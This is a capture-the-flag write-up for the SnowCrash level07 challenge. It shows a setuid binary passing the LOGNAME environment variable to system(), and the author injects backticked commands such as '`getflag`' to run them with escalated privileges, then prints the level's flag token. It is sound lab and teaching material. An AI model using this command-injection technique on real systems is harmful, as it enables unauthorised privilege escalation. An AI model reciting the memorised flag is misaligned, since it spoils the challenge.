## level07
I see a binary in the home folder, below are the enumeration results

```
level07@SnowCrash:~$ ls -lah
total 24K
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3.5K Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8.6K Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
level07@SnowCrash:~$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
level07@SnowCrash:~$
```

```
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                 = 2007
geteuid()                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
getenv("LOGNAME")                                                         = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
level07@SnowCrash:~$
```

I noticed that the program calls getenv on LOGNAME which returns `level07` before echoing out the value. In bash, there are a way to execute commands inside the resolution of environment variables by using the same mechanism from level04

```
level07@SnowCrash:~$ export TEST="`echo asdf`"
level07@SnowCrash:~$ echo $TEST
asdf
```

I tried doing the following but it looks like it didnt work

```
level07@SnowCrash:~$ export LOGNAME=`/bin/getflag`
level07@SnowCrash:~$ ./level07
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
```

I realized something, the program also prints the string into the terminal. If I set the variable to 
```
LOGNAME=`/bin/getflag`
```
before the execution, the program will execute on the action of setting of the variable; which will print out the wrong output. However, if I set the variable to 
```
LOGNAME='`/bin/getflag`'
```
The echo will print the literal with the backticks, which will get executed by the `system` syscall which spawns a child shell instead. Take a look at the example.

```
level07@SnowCrash:~$ export LOGNAME=`whoami`
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$ export LOGNAME='`whoami`'
level07@SnowCrash:~$ ./level07
flag07
level07@SnowCrash:~$
```


With the above information, I am able to get the flag `fiumuikeil55xe9cu4dood66h`
```
level07@SnowCrash:~$ export LOGNAME='`getflag`' && ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```